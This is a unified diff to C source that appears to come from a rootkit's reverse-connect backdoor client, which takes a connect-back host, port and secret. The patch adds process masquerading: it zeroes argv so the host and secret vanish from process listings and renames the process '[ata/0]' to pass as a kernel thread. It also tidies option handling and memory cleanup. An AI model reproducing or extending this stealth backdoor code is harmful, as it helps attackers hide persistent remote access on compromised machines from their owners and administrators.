@@ -279,7 +279,7 @@ void hide_conn(struct sockaddr_in addr, int hide)
 
 int main(int argc, char **argv)
 {
-	int ret, len, pid, opt, client, delay = 0;
+	int ret, len, pid, opt, client, arg0_len, delay = 0;
 	short int connect_back_port = 0;
 	char *connect_back_host = NULL;
 	char *secret = NULL;
@@ -290,7 +290,7 @@ int main(int argc, char **argv)
 	while ((opt = getopt(argc, argv, "t:s:p:r:")) != -1) {
 		switch (opt) {
 		case 't':
-			connect_back_host = optarg;
+			connect_back_host = strdup(optarg);
 			break;
 		case 'p':
 			connect_back_port = atoi(optarg);
@@ -298,11 +298,11 @@ int main(int argc, char **argv)
 #ifndef _REPTILE_
 				usage(*argv);		
 #endif
-				exit(1);
+				goto out;
 			}
 			break;
 		case 's':
-			secret = optarg;
+			secret = strdup(optarg);
 			break;
 		case 'r':
 			delay = atoi(optarg);
@@ -321,8 +321,38 @@ int main(int argc, char **argv)
 #ifndef _REPTILE_
 		usage(*argv);		
 #endif
-		exit(1);
+		goto out;
 	}
+
+	arg0_len = strlen(argv[0]);
+	bzero(argv[0], arg0_len);
+	
+	if (arg0_len >= 7)
+		strcpy(argv[0], "[ata/0]");
+
+	if(argv[1])
+		bzero(argv[1], strlen(argv[1]));
+	
+	if(argv[2])
+		bzero(argv[2], strlen(argv[2]));
+	
+	if(argv[3])
+		bzero(argv[3], strlen(argv[3]));
+	
+	if(argv[4])
+		bzero(argv[4], strlen(argv[4]));
+	
+	if(argv[5])
+		bzero(argv[5], strlen(argv[5]));
+	
+	if(argv[6])
+		bzero(argv[6], strlen(argv[6]));
+	
+	if(argv[7])
+		bzero(argv[7], strlen(argv[7]));
+	
+	if(argv[8])
+		bzero(argv[8], strlen(argv[8]));
 
 	pid = fork();
 
@@ -433,6 +463,13 @@ int main(int argc, char **argv)
 #endif
 
 	} while (delay > 0);
+
+out:
+	if (connect_back_host) 
+		free(connect_back_host);
+
+	if (secret) 
+		free(secret);
 
 	return 0;
 }
